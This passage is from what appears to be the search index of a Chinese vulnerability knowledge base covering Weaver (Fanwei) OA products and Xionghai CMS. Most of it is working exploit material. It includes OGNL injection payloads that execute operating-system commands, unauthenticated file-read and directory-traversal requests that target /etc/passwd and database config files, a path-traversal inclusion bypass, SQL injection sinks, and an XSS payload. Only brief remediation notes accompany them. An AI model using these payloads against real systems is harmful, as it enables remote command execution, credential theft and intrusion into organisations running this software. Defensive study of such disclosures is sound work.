\\({\u6807\u8bc6\u7b26}\"\uff0c\u4f46\u5728\u8fd9\u4e2a\u4e2d\u5e76\u4e0d\u9700\u8981\\) \u6765\u5305\u62ec http://www.xxx.com/login.do?message=104-2&verify= \u7ed3\u679c\u53ef\u4ee5\u88ab\u6267\u884c\u6210\u529f\uff0c\u8868\u793a\u6f0f\u6d1e\u5b58\u5728\u53ef\u6ce8\u5165 \u8fd9\u91cc\u6709\u4e24\u4e2apoc\u53ef\u5229\u7528 message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())\u4e0b\u9762\u9700\u8981Post\u8bf7\u6c42message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami","title":"\u6cdb\u5faee-mobile ognl\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u4fe1\u606f: \u00b6 \u6cdb\u5fae\u4e91\u6865\u662f\u4e00\u4e2a\u4e3a\u4e86\u6ee1\u8db3\u7528\u6237\u63d0\u51fa\u7684\u963f\u91cc\u9489\u9489\u4e0e\u6cdb\u5faeOA\u96c6\u6210\u9700\u6cdb\u5fae0A\u4e91\u6865e-bridge \u5176 /wxjsapi/saveYZJFile \u63a5\u53e3\u53ef\u4ee5\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u4fdd\u5b58\uff0c\u800c\u540e\u53ef\u901a\u8fc7/file/fileNoLogin/{id}\uff0c\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002 \u5f71\u54cd\u8303\u56f4: \u00b6 \u4e3b\u8981\u5f71\u54cd 2018-2019 \u7248\u672c \u6f0f\u6d1e\u590d\u73b0: \u00b6 \u5982\u679c\u4f7f\u7528POC\u56de\u663e** \"\u65e0\u6cd5\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\uff01\" \u8bc1\u660e\u6539\u6f0f\u6d1e\u5df2\u88ab\u4fee\u590d **POC\u4e2d\uff0c\u5f53downloadUrl\u7684\u8def\u5f84\u4e3a\u6587\u4ef6\u5939\u7684\u65f6\u5019\u7ed3\u679c\u4e3a\u76ee\u5f55\u904d\u5386 linux windows \u901a\u7528 Windows POC\uff1a /wxjsapi/saveYZJFile?fileName=test & downloadUrl=file:///C:/ & fileExt=txt #\u67e5\u770b\u9875\u9762\u4e2d\u7684id\u503c /file/fileNoLogin/<id> #\u8bbf\u95ee\u6587\u4ef6\u63a5\u53e3\uff0c\u6839\u636e\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684id\u5bf9\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u8bfb\u53d6 \u5982\u679c\u63d0\u793a msg \"/C: (No such file or directory)\" \u5c31\u8868\u793a\u4e3aLinux\u7cfb\u7edf\uff08\u8868\u793a\u4e0d\u5b58\u5728C\u76d8\uff09 Linux POC\uff1a /wxjsapi/saveYZJFile?fileName=test & downloadUrl=file:///etc/passwd & fileExt=txt /file/fileNoLogin/ < id > #\u8bbf\u95ee\u6587\u4ef6\u63a5\u53e3\uff0c\u6839\u636e\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684id\u5bf9\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u8bfb\u53d6 04 \u5b9e\u4f8b \u00b6 Linux\u7cfb\u7edf\u4e3b\u76ee\u5f55\uff08\u6839\u76ee\u5f55\uff09 Linux\u4e2d/ect/passwd\u6587\u4ef6 \u4fee\u590d\u65b9\u6848: \u00b6 \u5c3d\u5feb\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c","title":"\u6cdb\u5fae\u4e91\u6865e-bridge \u76ee\u5f55\u904d\u5386/\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_1","text":"\u6cdb\u5fae\u4e91\u6865\u662f\u4e00\u4e2a\u4e3a\u4e86\u6ee1\u8db3\u7528\u6237\u63d0\u51fa\u7684\u963f\u91cc\u9489\u9489\u4e0e\u6cdb\u5faeOA\u96c6\u6210\u9700\u6cdb\u5fae0A\u4e91\u6865e-bridge \u5176 /wxjsapi/saveYZJFile \u63a5\u53e3\u53ef\u4ee5\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u4fdd\u5b58\uff0c\u800c\u540e\u53ef\u901a\u8fc7/file/fileNoLogin/{id}\uff0c\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002","title":"\u6f0f\u6d1e\u4fe1\u606f:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_2","text":"\u4e3b\u8981\u5f71\u54cd 2018-2019 \u7248\u672c","title":"\u5f71\u54cd\u8303\u56f4:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_3","text":"\u5982\u679c\u4f7f\u7528POC\u56de\u663e** \"\u65e0\u6cd5\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\uff01\" \u8bc1\u660e\u6539\u6f0f\u6d1e\u5df2\u88ab\u4fee\u590d **POC\u4e2d\uff0c\u5f53downloadUrl\u7684\u8def\u5f84\u4e3a\u6587\u4ef6\u5939\u7684\u65f6\u5019\u7ed3\u679c\u4e3a\u76ee\u5f55\u904d\u5386 linux windows \u901a\u7528 Windows POC\uff1a /wxjsapi/saveYZJFile?fileName=test & downloadUrl=file:///C:/ & fileExt=txt #\u67e5\u770b\u9875\u9762\u4e2d\u7684id\u503c /file/fileNoLogin/<id> #\u8bbf\u95ee\u6587\u4ef6\u63a5\u53e3\uff0c\u6839\u636e\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684id\u5bf9\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u8bfb\u53d6 \u5982\u679c\u63d0\u793a msg \"/C: (No such file or directory)\" \u5c31\u8868\u793a\u4e3aLinux\u7cfb\u7edf\uff08\u8868\u793a\u4e0d\u5b58\u5728C\u76d8\uff09 Linux POC\uff1a /wxjsapi/saveYZJFile?fileName=test & downloadUrl=file:///etc/passwd & fileExt=txt /file/fileNoLogin/ < id > #\u8bbf\u95ee\u6587\u4ef6\u63a5\u53e3\uff0c\u6839\u636e\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684id\u5bf9\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u8bfb\u53d6","title":"\u6f0f\u6d1e\u590d\u73b0:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#04","text":"Linux\u7cfb\u7edf\u4e3b\u76ee\u5f55\uff08\u6839\u76ee\u5f55\uff09 Linux\u4e2d/ect/passwd\u6587\u4ef6","title":"04 \u5b9e\u4f8b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_4","text":"\u5c3d\u5feb\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c","title":"\u4fee\u590d\u65b9\u6848:"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6,/wxjsapi/saveYZJFile\u63a5\u53e3\u83b7\u53d6filepath,\u8fd4\u56de\u6570\u636e\u5305\u5185\u51fa\u73b0\u4e86\u7a0b\u5e8f\u7684\u7edd\u5bf9\u8def\u5f84,\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8fd4\u56de\u5185\u5bb9\u8bc6\u522b\u7a0b\u5e8f\u8fd0\u884c\u8def\u5f84\u4ece\u800c\u4e0b\u8f7d\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u5371\u5bb3\u53ef\u89c1\u3002 1\u3001 downloadUrl\u53c2\u6570\u4fee\u6539\u6210\u9700\u8981\u83b7\u53d6\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84,\u8bb0\u5f55\u8fd4\u56de\u5305\u4e2d\u7684id\u503c\u3002 2\u3001\u901a\u8fc7\u67e5\u770b\u6587\u4ef6\u63a5\u53e3\u8bbf\u95ee /file/fileNoLogin/id \u6cdb\u5fae\u4e91\u6865\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u5347\u7ea7\u73a9\u6cd5\u3002 \u00b6 1\u3001\u7b80\u5355\u8bf4\u8bf4\u6cdb\u5fae\u4e91\u6865\u7684\u62a5\u544a,\u8f93\u5165\u6587\u4ef6\u8def\u5f84->\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9,\u6211\u4eec\u8bfb\u4e86\u4e00\u4e0b\u4ee3\u7801\u540e\u53d1\u73b0\u8fd9\u8fd8\u80fd\u8bfb\u53d6\u6587\u4ef6\u76ee\u5f55\u3002 2\u3001\u53c2\u6570\u4e0d\u586b\u5199\u7edd\u5bf9\u8def\u5f84\u5199\u8fdb\u6587\u672c\u5185\u5bb9\u5c31\u662f\u5f53\u524d\u7684\u76ee\u5f55,\u4ea7\u751f\u4e86\u4e00\u4e2a\u65b0\u7684\u6f0f\u6d1e \u201c\u76ee\u5f55\u904d\u5386\u201d /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///D:/&fileExt=txt 3\u3001\u76ee\u5f55\u904d\u5386+\u6587\u4ef6\u8bfb\u53d6,\u6211\u4eec\u80fd\u505a\u7684\u4e8b\u60c5\u5c31\u5f88\u591a\u4e86,\u6bd4\u5982\u8bfb\u53d6\u7ba1\u7406\u5458\u5728\u684c\u9762\u7559\u4e0b\u7684\u5bc6\u7801\u6587\u4ef6\u3001\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3001nginx\u4ee3\u7406\u914d\u7f6e\u3001\u8bbf\u95ee\u65e5\u5fd7\u3001D\u76d8\u8fc5\u96f7\u4e0b\u8f7d\u3002 d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties \u6cdb\u5faeOA\u6570\u636e\u5e93 \u4fee\u590d\u5efa\u8bae: \u5173\u95ed\u7a0b\u5e8f\u8def\u7531 /file/fileNoLogin","title":"\u6cdb\u5fae\u4e91\u6865\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_1","text":"1\u3001\u7b80\u5355\u8bf4\u8bf4\u6cdb\u5fae\u4e91\u6865\u7684\u62a5\u544a,\u8f93\u5165\u6587\u4ef6\u8def\u5f84->\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9,\u6211\u4eec\u8bfb\u4e86\u4e00\u4e0b\u4ee3\u7801\u540e\u53d1\u73b0\u8fd9\u8fd8\u80fd\u8bfb\u53d6\u6587\u4ef6\u76ee\u5f55\u3002 2\u3001\u53c2\u6570\u4e0d\u586b\u5199\u7edd\u5bf9\u8def\u5f84\u5199\u8fdb\u6587\u672c\u5185\u5bb9\u5c31\u662f\u5f53\u524d\u7684\u76ee\u5f55,\u4ea7\u751f\u4e86\u4e00\u4e2a\u65b0\u7684\u6f0f\u6d1e \u201c\u76ee\u5f55\u904d\u5386\u201d /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///D:/&fileExt=txt 3\u3001\u76ee\u5f55\u904d\u5386+\u6587\u4ef6\u8bfb\u53d6,\u6211\u4eec\u80fd\u505a\u7684\u4e8b\u60c5\u5c31\u5f88\u591a\u4e86,\u6bd4\u5982\u8bfb\u53d6\u7ba1\u7406\u5458\u5728\u684c\u9762\u7559\u4e0b\u7684\u5bc6\u7801\u6587\u4ef6\u3001\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3001nginx\u4ee3\u7406\u914d\u7f6e\u3001\u8bbf\u95ee\u65e5\u5fd7\u3001D\u76d8\u8fc5\u96f7\u4e0b\u8f7d\u3002 d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties \u6cdb\u5faeOA\u6570\u636e\u5e93 \u4fee\u590d\u5efa\u8bae: \u5173\u95ed\u7a0b\u5e8f\u8def\u7531 /file/fileNoLogin","title":"\u6cdb\u5fae\u4e91\u6865\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u5347\u7ea7\u73a9\u6cd5\u3002"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","text":"\u6f0f\u6d1e\u8be6\u60c5 \u00b6 \u8ddf\u8fdb\u6587\u4ef6 <?php //\u5355\u4e00\u5165\u53e3\u6a21\u5f0f error_reporting(0); //\u5173\u95ed\u9519\u8bef\u663e\u793a $file=addslashes($_GET['r']); //\u63a5\u6536\u6587\u4ef6\u540d $action=$file==''?'index':$file; //\u5224\u65ad\u4e3a\u7a7a\u6216\u8005\u7b49\u4e8eindex include('files/'.$action.'.php'); //\u8f7d\u5165\u76f8\u5e94\u6587\u4ef6 ?> \u4ee3\u7801\u903b\u8f91\u5927\u6982\u4e3a\uff0c\u901a\u8fc7GET\u578b\u4f20\u53c2\u4f20\u5165r\uff0c\u5e76\u5c06\u503c\u7ecf\u8fc7\u4e00\u4e2aaddslashes()\u51fd\u6570\u64cd\u4f5c\uff0c\u7136\u540e\u4e00\u4e2a\u4e09\u5143\u8fd0\u7b97\u7b26\u5224\u65ad\u8981\u8f7d\u5165\u7684\u6587\u4ef6\uff0c\u76f4\u63a5\u8fdb\u5165include\u51fd\u6570\u5305\u542b\u3002 include('files/'.$action.'.php');\u8fd9\u6761\u8bed\u53e5\u5305\u542b\u4e86file\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002 \u8bed\u6cd5\u4e3a\uff1a\u6761\u4ef6\u8868\u8fbe\u5f0f\uff1f\u8868\u8fbe\u5f0f1\uff1a\u8868\u8fbe\u5f0f2 \u95ee\u53f7\u524d\u9762\u7684\u4f4d\u7f6e\u662f\u5224\u65ad\u7684\u6761\u4ef6\uff0c\u5224\u65ad\u7ed3\u679c\u4e3abool\u578b\uff0c\u4e3atrue\u662f\u8c03\u7528\u8868\u8fbe\u5f0f1\uff0c\u4e3afalse\u65f6\u8c03\u7528\u8868\u8fbe\u5f0f2. \u7531\u4ee3\u7801\u903b\u8f91\u53ef\u77e5\uff0c\u4ee3\u7801\u9650\u5236\u4e86\u6211\u4eec\u8bbf\u95ee\u7684\u76ee\u5f55\u4e3afile\u3002 Bypass:\u53ef\u7528../\u8fdb\u884c\u76ee\u5f55\u8df3\u8f6c\u3002 \u6f0f\u6d1e\u6f14\u793a \u00b6 \u6211\u4eec\u9996\u5148\u5728cms\u6839\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2aphpinfo\u6587\u4ef6 \u7136\u540e\u6211\u4eec\u5728\u672c\u5730\u8bbf\u95eeindex.php\u6dfb\u52a0\u5982\u4e0b\u53c2\u6570\u3002\u5373\u53ef\u6b63\u786e\u89e3\u6790phpinfo\u754c\u9762 \u56e0\u4e3a\u6b64\u5904\u4ee3\u7801\u4f1a\u81ea\u52a8\u5728\u6587\u4ef6\u540d\u540e\u6dfb\u52a0.php\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u6dfb\u52a0\u540e\u7f00\u540d\uff0c\u5426\u5219\u65e0\u6cd5\u6b63\u5e38\u89e3\u6790 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7629","title":"\u4e3b\u76ee\u5f55\u5b58\u5728\u6587\u4ef6\u5305\u542b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_1","text":"\u8ddf\u8fdb\u6587\u4ef6 <?php //\u5355\u4e00\u5165\u53e3\u6a21\u5f0f error_reporting(0); //\u5173\u95ed\u9519\u8bef\u663e\u793a $file=addslashes($_GET['r']); //\u63a5\u6536\u6587\u4ef6\u540d $action=$file==''?'index':$file; //\u5224\u65ad\u4e3a\u7a7a\u6216\u8005\u7b49\u4e8eindex include('files/'.$action.'.php'); //\u8f7d\u5165\u76f8\u5e94\u6587\u4ef6 ?> \u4ee3\u7801\u903b\u8f91\u5927\u6982\u4e3a\uff0c\u901a\u8fc7GET\u578b\u4f20\u53c2\u4f20\u5165r\uff0c\u5e76\u5c06\u503c\u7ecf\u8fc7\u4e00\u4e2aaddslashes()\u51fd\u6570\u64cd\u4f5c\uff0c\u7136\u540e\u4e00\u4e2a\u4e09\u5143\u8fd0\u7b97\u7b26\u5224\u65ad\u8981\u8f7d\u5165\u7684\u6587\u4ef6\uff0c\u76f4\u63a5\u8fdb\u5165include\u51fd\u6570\u5305\u542b\u3002 include('files/'.$action.'.php');\u8fd9\u6761\u8bed\u53e5\u5305\u542b\u4e86file\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002 \u8bed\u6cd5\u4e3a\uff1a\u6761\u4ef6\u8868\u8fbe\u5f0f\uff1f\u8868\u8fbe\u5f0f1\uff1a\u8868\u8fbe\u5f0f2 \u95ee\u53f7\u524d\u9762\u7684\u4f4d\u7f6e\u662f\u5224\u65ad\u7684\u6761\u4ef6\uff0c\u5224\u65ad\u7ed3\u679c\u4e3abool\u578b\uff0c\u4e3atrue\u662f\u8c03\u7528\u8868\u8fbe\u5f0f1\uff0c\u4e3afalse\u65f6\u8c03\u7528\u8868\u8fbe\u5f0f2. \u7531\u4ee3\u7801\u903b\u8f91\u53ef\u77e5\uff0c\u4ee3\u7801\u9650\u5236\u4e86\u6211\u4eec\u8bbf\u95ee\u7684\u76ee\u5f55\u4e3afile\u3002 Bypass:\u53ef\u7528../\u8fdb\u884c\u76ee\u5f55\u8df3\u8f6c\u3002","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_2","text":"\u6211\u4eec\u9996\u5148\u5728cms\u6839\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2aphpinfo\u6587\u4ef6 \u7136\u540e\u6211\u4eec\u5728\u672c\u5730\u8bbf\u95eeindex.php\u6dfb\u52a0\u5982\u4e0b\u53c2\u6570\u3002\u5373\u53ef\u6b63\u786e\u89e3\u6790phpinfo\u754c\u9762 \u56e0\u4e3a\u6b64\u5904\u4ee3\u7801\u4f1a\u81ea\u52a8\u5728\u6587\u4ef6\u540d\u540e\u6dfb\u52a0.php\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u6dfb\u52a0\u540e\u7f00\u540d\uff0c\u5426\u5219\u65e0\u6cd5\u6b63\u5e38\u89e3\u6790","title":"\u6f0f\u6d1e\u6f14\u793a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_3","text":"https://xz.aliyun.com/t/7629","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%89%8D%E5%8F%B0%E5%A4%9A%E5%A4%84SQL%E6%B3%A8%E5%85%A5/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 \u7ed3\u5408RIPS\u626b\u63cf\u7ed3\u679c\u53ef\u53d1\u73b0\u591a\u5904sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u8be5CMS\u91c7\u7528\u8fc7\u6ee4\u65b9\u5f0f\u5927\u591a\u662f\u901a\u8fc7addslashes()\u51fd\u6570\u8fc7\u6ee4\u3002 \u5355\u7eaf\u4f7f\u7528addslashes()\u51fd\u6570\u4f1a\u9020\u6210\u4e24\u4e2a\u95ee\u9898\uff1a 1.\u662f\u5426\u91c7\u7528GBK\uff08\u5bbd\u5b57\u8282\u6ce8\u5165\uff09 2.sql\u8bed\u53e5\u662f\u5426\u91c7\u7528\u4e86\u5355\u5f15\u53f7\u95ed\u5408\u3002 software.php \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/software.php\u7b2c13\u884c\uff0cwhere\u540e\u5b57\u53e5\u5fd8\u8bb0\u52a0\u5355\u5f15\u53f7\u4fdd\u62a4\u3002 $query = \"UPDATE download SET hit = hit+1 WHERE id=$id\"; ontent.php \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/content.php\u7b2c19\u884c\uff0cwhere\u540e\u5b57\u53e5\u5fd8\u8bb0\u52a0\u5355\u5f15\u53f7\u4fdd\u62a4\u3002 $query = \"UPDATE content SET hit = hit+1 WHERE id=$id\"; submit.php \u9996\u5148\u53ef\u770b\u89c1 \u8fc7\u6ee4\u548c\u4f20\u53c2 $type=addslashes($_GET['type']); $name=$_POST['name']; $mail=$_POST['mail']; $url=$_POST['url']; $content=$_POST['content']; $cid=$_POST['cid']; $ip=$_SERVER[\"REMOTE_ADDR\"]; $tz=$_POST['tz']; if ($tz==\"\"){$tz=0;} $jz=$_POST['jz']; \u53ea\u5bf9type\u53c2\u6570\u8fdb\u884c\u4e86\u8fc7\u6ee4\uff0c\u56e0\u6b64\u5176\u4ed6\u53c2\u6570\u6d89\u53ca\u5230sql\u8bed\u53e5\u7684\u53ef\u80fd\u5b58\u5728sql\u6ce8\u5165\u3002 \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php\u7b2c66\u884c $query = \"SELECT * FROM interaction WHERE( mail = '$mail')\"; \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php \u7b2c121-147\u884c $query = \"INSERT INTO interaction ( type, xs, cid, name, mail, url, touxiang, shebei, ip, content, tz, date ) VALUES ( '$type', '$xs', '$cid', '$name', '$mail', '$url', '$touxiang', '$shebei', '$ip', '$content', '$tz', now() )\"; \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php \u7b2c176\u884c $query = \"SELECT * FROM content WHERE( id= $cid)\"; \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php \u7b2c206\u884c $query = \"SELECT * FROM download WHERE( id= $cid)\"; \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7629","title":"\u524d\u53f0\u591a\u5904SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%89%8D%E5%8F%B0%E5%A4%9A%E5%A4%84SQL%E6%B3%A8%E5%85%A5/#_1","text":"\u7ed3\u5408RIPS\u626b\u63cf\u7ed3\u679c\u53ef\u53d1\u73b0\u591a\u5904sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u8be5CMS\u91c7\u7528\u8fc7\u6ee4\u65b9\u5f0f\u5927\u591a\u662f\u901a\u8fc7addslashes()\u51fd\u6570\u8fc7\u6ee4\u3002 \u5355\u7eaf\u4f7f\u7528addslashes()\u51fd\u6570\u4f1a\u9020\u6210\u4e24\u4e2a\u95ee\u9898\uff1a 1.\u662f\u5426\u91c7\u7528GBK\uff08\u5bbd\u5b57\u8282\u6ce8\u5165\uff09 2.sql\u8bed\u53e5\u662f\u5426\u91c7\u7528\u4e86\u5355\u5f15\u53f7\u95ed\u5408\u3002 software.php \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/software.php\u7b2c13\u884c\uff0cwhere\u540e\u5b57\u53e5\u5fd8\u8bb0\u52a0\u5355\u5f15\u53f7\u4fdd\u62a4\u3002 $query = \"UPDATE download SET hit = hit+1 WHERE id=$id\"; ontent.php \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/content.php\u7b2c19\u884c\uff0cwhere\u540e\u5b57\u53e5\u5fd8\u8bb0\u52a0\u5355\u5f15\u53f7\u4fdd\u62a4\u3002 $query = \"UPDATE content SET hit = hit+1 WHERE id=$id\"; submit.php \u9996\u5148\u53ef\u770b\u89c1 \u8fc7\u6ee4\u548c\u4f20\u53c2 $type=addslashes($_GET['type']); $name=$_POST['name']; $mail=$_POST['mail']; $url=$_POST['url']; $content=$_POST['content']; $cid=$_POST['cid']; $ip=$_SERVER[\"REMOTE_ADDR\"]; $tz=$_POST['tz']; if ($tz==\"\"){$tz=0;} $jz=$_POST['jz']; \u53ea\u5bf9type\u53c2\u6570\u8fdb\u884c\u4e86\u8fc7\u6ee4\uff0c\u56e0\u6b64\u5176\u4ed6\u53c2\u6570\u6d89\u53ca\u5230sql\u8bed\u53e5\u7684\u53ef\u80fd\u5b58\u5728sql\u6ce8\u5165\u3002 \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php\u7b2c66\u884c $query = \"SELECT * FROM interaction WHERE( mail = '$mail')\"; \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php \u7b2c121-147\u884c $query = \"INSERT INTO interaction ( type, xs, cid, name, mail, url, touxiang, shebei, ip, content, tz, date ) VALUES ( '$type', '$xs', '$cid', '$name', '$mail', '$url', '$touxiang', '$shebei', '$ip', '$content', '$tz', now() )\"; \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php \u7b2c176\u884c $query = \"SELECT * FROM content WHERE( id= $cid)\"; \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php \u7b2c206\u884c $query = \"SELECT * FROM download WHERE( id= $cid)\";","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%89%8D%E5%8F%B0%E5%A4%9A%E5%A4%84SQL%E6%B3%A8%E5%85%A5/#_2","text":"https://xz.aliyun.com/t/7629","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 \u53cd\u5c04\u578bXSS \u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/contact.php \u7b2c12~15\u884c $page=addslashes($_GET['page']); if ($page<>\"\"){ if ($page<>1){ $pages=\"\u7b2c\".$page.\"\u9875 - \"; \u7ecf\u8fc7\u4e00\u6b21addslashes\u51fd\u6570\u5904\u7406\u5c31\u76f4\u63a5\u5e26\u5165\u9875\u9762\u3002 \u590d\u73b0\u8fc7\u7a0b \u00b6 \u6211\u4eec\u8bbf\u95ee\u7f51\u5740\u7684\u8054\u7cfb\u529f\u80fd\uff0c\u627e\u5230\u4e86\u4ee3\u7801\u5bf9\u4e8e\u7684page\u53c2\u6570\uff0c\u5176\u5b9e\u5c31\u662f\u7559\u8a00\u5217\u8868\u7684\u9875\u6570\u3002 \u6211\u4eec\u5c1d\u8bd5\u63d2\u5165\u4e00\u4e2a\u7b80\u5355XSS payload page=<img src=x onerror=alert(/xss/);> \u6f0f\u6d1e\u5229\u7528\u6210\u529f\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 